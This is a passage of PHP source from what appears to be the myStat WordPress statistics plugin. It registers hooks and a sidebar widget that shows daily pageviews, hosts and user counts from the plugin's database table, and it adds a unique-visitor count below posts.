    for($j=0;$j<count($menu_tmp);$j++){
        $myStat_aex[]=$myStat_main->getClass($menu_tmp[$j],$menu_item[$i]);
    };
};
$myStat_ajax->export($myStat_aex);
$myStat_ajax->header="Content-type: text/html; charset=UTF-8";
$myStat_ajax->init();

add_action('admin_menu', 'myStat_menu');

add_action('template_redirect', 'myStat_header');

add_action('loop_start', 'myStat_load');

#add_action('wp_footer', 'myStat_footer');
add_action('loop_end', 'myStat_footer');




function myStat_widget_init($args) {
    if ( !function_exists('register_sidebar_widget') || !function_exists('register_widget_control') )
        return;
    // Multifunctional StatPress pluging
    function myStat_widget_control() {
        $options = get_option('myStat_widget');
        if ( !is_array($options) )
            $options = array('title'=>'myStat', 'st_pageviews'=>1, 'st_hosts'=>1, 'st_users'=>0, 'st_auth'=>0);
        if ( $_POST['myStat-submit'] ) {
            $options['title'] = strip_tags(stripslashes($_POST['myStat-title']));
            $options['st_pageviews'] = stripslashes($_POST['myStat-st_pageviews']);
            $options['st_hosts'] = stripslashes($_POST['myStat-st_hosts']);
            $options['st_users'] = stripslashes($_POST['myStat-st_users']);
            $options['st_auth'] = stripslashes($_POST['myStat-st_auth']);
            update_option('myStat_widget', $options);
        }
        $title = htmlspecialchars($options['title'], ENT_QUOTES);
        $st_pageviews = htmlspecialchars($options['st_pageviews'], ENT_QUOTES);
        $st_hosts = htmlspecialchars($options['st_hosts'], ENT_QUOTES);
        $st_users = htmlspecialchars($options['st_users'], ENT_QUOTES);
        $st_auth = htmlspecialchars($options['st_auth'], ENT_QUOTES);
        echo '<label for="myStat-title">' . __('Title:',"myStat") . ' </label><br/><input style="width: 250px;" id="myStat-title" name="myStat-title" type="text" value="'.$title.'" />';
        echo '<br/><br/><p><input type="checkbox" id="myStat-st_pageviews" name="myStat-st_pageviews" value="1" '.($st_pageviews==1?"checked":"").' /> <label for="myStat-st_pageviews">' . __('Pageviews', 'myStat') . '</label></p>';
        echo '<br/><p><input type="checkbox" id="myStat-st_hosts" name="myStat-st_hosts" value="1" '.($st_hosts==1?"checked":"").' /> <label for="myStat-st_hosts">' . __('Hosts', 'myStat') . '</label></p>';
        echo '<br/><p><input type="checkbox" id="myStat-st_users" name="myStat-st_users" value="1" '.($st_users==1?"checked":"").' /> <label for="myStat-st_users">' . __('Users', 'myStat') . '</label></p>';
        echo '<br/><p><input type="checkbox" id="myStat-st_auth" name="myStat-st_auth" value="1" '.($st_auth==1?"checked":"").' /> <label for="myStat-st_auth">' . __('Login Users', 'myStat') . '</label></p>';
        echo '<input type="hidden" id="myStat-submit" name="myStat-submit" value="1" />';
    }
    function myStat_widget($args) {
        extract($args);
        global $wpdb;
        $options = get_option('myStat_widget');
        $title = $options['title'];
        $pageviews = $options['st_pageviews'];
        $hosts = $options['st_hosts'];
        $users = $options['st_users'];
        $auth = $options['st_auth'];
        echo $before_widget;
        print($before_title . $title . $after_title);
        if($pageviews==1){
            $var=$wpdb->get_var("SELECT sum(count) FROM `".$wpdb->prefix."myStat_main` WHERE  TO_DAYS(date) = TO_DAYS(now());");
            echo __('Pageviews', 'myStat').": <i>".$var."</i><br/>";
        };
        if($hosts==1){
            $var=$wpdb->get_var("SELECT count(DISTINCT ip) FROM `".$wpdb->prefix."myStat_main` WHERE  TO_DAYS(date) = TO_DAYS(now());");
            echo __('Hosts', 'myStat').": <i>".$var."</i><br/>";
        };
        if($users==1){
            $var=$wpdb->get_var("SELECT count(DISTINCT ip) FROM `".$wpdb->prefix."myStat_main` WHERE  TO_DAYS(date) = TO_DAYS(now()) AND (date_load!='0000-00-00 00:00:00' or title!='');");
            echo __('Users', 'myStat').": <i>".$var."</i><br/>";
        };
        if($auth==1){
            $var=$wpdb->get_var("SELECT count(DISTINCT user) FROM `".$wpdb->prefix."myStat_main` WHERE  TO_DAYS(date) = TO_DAYS(now()) AND users!='';", ARRAY_N);
            echo __('Login Users', 'myStat').": <i>".$var."</i><br/>";
        };

        echo $after_widget;
    }
    register_sidebar_widget(__("myStat statistics","myStat"), 'myStat_widget');
    register_widget_control(__("myStat statistics","myStat"),'myStat_widget_control',300,200);
}


add_action('plugins_loaded', 'myStat_widget_init');
add_filter('the_content','myStat_Post',100);
function myStat_Post($content){
    if(get_option("myStat_show_post_stat")==1){
        $var=$GLOBALS['wpdb']->get_var("SELECT count(DISTINCT ip) FROM `".$GLOBALS['wpdb']->prefix."myStat_main` WHERE post_id=".get_the_id()." AND (date_load!='0000-00-00 00:00:00' or title!='');");
        $content .= "<br/><a href='".$GLOBALS['myStat_uri']."'><img src='".WP_PLUGIN_URL."/".dirname(plugin_basename(__FILE__))."/images/admin.png' style='vertical-align:middle;' title='".__("myStat statistic for WordPress","myStat")."' border='0' /></a> ".__("Unique visitors to post","myStat").": <b>".($var!=''?number_format($var,0,',',' '):0)."</b><br/><br/>";
    };
	return $content;	
};
 

?>